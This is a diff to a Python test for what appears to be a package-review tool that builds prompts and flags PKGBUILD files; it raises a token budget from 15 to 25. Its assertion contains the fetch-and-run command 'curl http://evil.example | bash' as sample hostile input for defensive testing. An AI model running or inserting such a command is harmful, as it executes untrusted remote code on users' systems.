@@ -239,7 +239,7 @@ def test_build_user_prompt_truncates_unflagged_files_when_over_budget():
         diff,
         static_findings_paths={"PKGBUILD"},
         count_tokens=lambda t: len(t.split()),
-        max_diff_tokens=15,
+        max_diff_tokens=25,
     )
     assert "curl http://evil.example | bash" in prompt
     assert "una línea" not in prompt
